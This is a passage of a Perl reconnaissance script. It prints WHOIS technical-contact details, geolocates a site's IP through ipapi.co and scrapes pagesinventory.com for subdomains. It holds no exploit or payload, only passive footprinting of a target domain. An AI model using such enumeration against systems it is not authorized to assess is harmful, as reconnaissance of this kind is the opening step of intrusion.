            print item(),'Tech Organization: ',
            $responseObject->{'WhoisRecord'}->{'technicalContact'}->{'organization'},"\n";}sleep(1);
        if (exists $responseObject->{'WhoisRecord'}->{'technicalContact'}->{'street1'}){
            print item(),'Tech Street: ',
            $responseObject->{'WhoisRecord'}->{'technicalContact'}->{'street1'},"\n";}sleep(1);
        if (exists $responseObject->{'WhoisRecord'}->{'technicalContact'}->{'city'}){
            print item(),'Tech City: ',
            $responseObject->{'WhoisRecord'}->{'technicalContact'}->{'city'},"\n";}sleep(1);
        if (exists $responseObject->{'WhoisRecord'}->{'technicalContact'}->{'state'}){
            print item(),'Tech State/Province: ',
            $responseObject->{'WhoisRecord'}->{'technicalContact'}->{'state'},"\n";}sleep(1);
        if (exists $responseObject->{'WhoisRecord'}->{'technicalContact'}->{'postalCode'}){
            print item(),'Tech Postal Code: ',
            $responseObject->{'WhoisRecord'}->{'technicalContact'}->{'postalCode'},"\n";}sleep(1);
        if (exists $responseObject->{'WhoisRecord'}->{'technicalContact'}->{'country'}){
            print item(),'Tech Country: ',
            $responseObject->{'WhoisRecord'}->{'technicalContact'}->{'country'},"\n";}sleep(1);
        if (exists $responseObject->{'WhoisRecord'}->{'technicalContact'}->{'email'}){
            print item(),'Tech Email: ',
            $responseObject->{'WhoisRecord'}->{'technicalContact'}->{'email'},"\n";}sleep(1);
        if (exists $responseObject->{'WhoisRecord'}->{'technicalContact'}->{'telephone'}){
            print item(),'Tech Phone: ',
            $responseObject->{'WhoisRecord'}->{'technicalContact'}->{'telephone'},"\n";}sleep(1);
        if (exists $responseObject->{'WhoisRecord'}->{'technicalContact'}->{'fax'}){
            print item(),'Tech Fax: ',
            $responseObject->{'WhoisRecord'}->{'technicalContact'}->{'fax'},"\n";}sleep(1);
    }else {
        print item(),"There Is A Problem\n\n";
        print item('1'),"Checking The Connection\n";
        print item('2'),"Enter Website Without HTTP/HTTPs\n";
        print item('3'),"Check If Website Working\n";
    }
}

sub weblocation {
    $ip= (gethostbyname($site))[4];
    my ($a,$b,$c,$d) = unpack('C4',$ip);
    $ip ="$a.$b.$c.$d";

    $url = "https://ipapi.co/$ip/json/";
    $request = $ua->get($url);
    $response = $request->content;

    if($response =~/country_name": "(.*?)"/){
        print item(),"IP Address: $ip\n";
        print item(),"Country: $1\n";
        if($response =~/city": "(.*?)"/){
            print item(),"City: $1\n";
        }if($response =~/region": "(.*?)"/){
            print item(),"Region: $1\n";
        }if($response =~/region_code": "(.*?)"/){
            print item(),"Region Code: $1\n";
        }if($response =~/continent_code": "(.*?)"/){
            print item(),"Continent Code: $1\n";
        }if($response =~/postal": "(.*?)"/){
            print item(),"Postal Code: $1\n";
        }if($response =~/latitude": (.*?),/){
            print item(),"Latitude / Longitude: $1, ";
        }if($response =~/longitude": (.*?),/){
            print color("bold white"),"$1\n";
        }if($response =~/timezone": "(.*?)"/){
            print item(),"Timezone: $1\n";
        }if($response =~/utc_offset": "(.*?)"/){
            print item(),"Utc Offset: $1\n";
        }if($response =~/country_calling_code": "(.*?)"/){
            print item(),"Calling Code: $1\n";
        }if($response =~/currency": "(.*?)"/){
            print item(),"Currency: $1\n";
        }if($response =~/languages": "(.*?)"/){
            print item(),"Languages: $1\n";
        }if($response =~/asn": "(.*?)"/){
            print item(),"ASN: $1\n";
        }if($response =~/org": "(.*?)"/){
            print item(),"ORG: $1\n";
        }
    }else {
        print item(),"There Is A Problem\n\n";
        print item('1'),"Checking The Connection\n";
        print item('2'),"Enter Website Without HTTP/HTTPs\n";
        print item('3'),"Check If Website/IP Working\n";
    }
}

sub subdomain {
    $url = "https://www.pagesinventory.com/search/?s=$site";
    $request = $ua->get($url);
    $response = $request->content;

    $ip= (gethostbyname($site))[4];
    my ($a,$b,$c,$d) = unpack('C4',$ip);
    $ip_address ="$a.$b.$c.$d";
    if($response =~ /Search result for/){
        print item(),"Website: $site\n";
        print item(),"IP: $ip_address\n\n";

        while($response =~ m/<td><a href=\"\/domain\/(.*?).html\">(.*?)<a href="\/ip\/(.*?).html">/g ) {

            print item(),"Subdomain: $1\n";
            print item('-'),"IP: $3\n\n";
            sleep(1);
        }
    }elsif($ip_address =~ /[0-9]/){
        if($response =~ /Nothing was found/){
            print item(),"Website: $site\n";
            print item(),"IP: $ip_address\n\n";
            print item(),"No Subdomains Found For This Domain\n";
        }}else {
        print item(),"There Is A Problem\n\n";
        print item('1'),"Checking The Connection\n";
        print item('2'),"Enter Website Without HTTP/HTTPs\n";
        print item('3'),"Check If Website Working\n";
    }
}

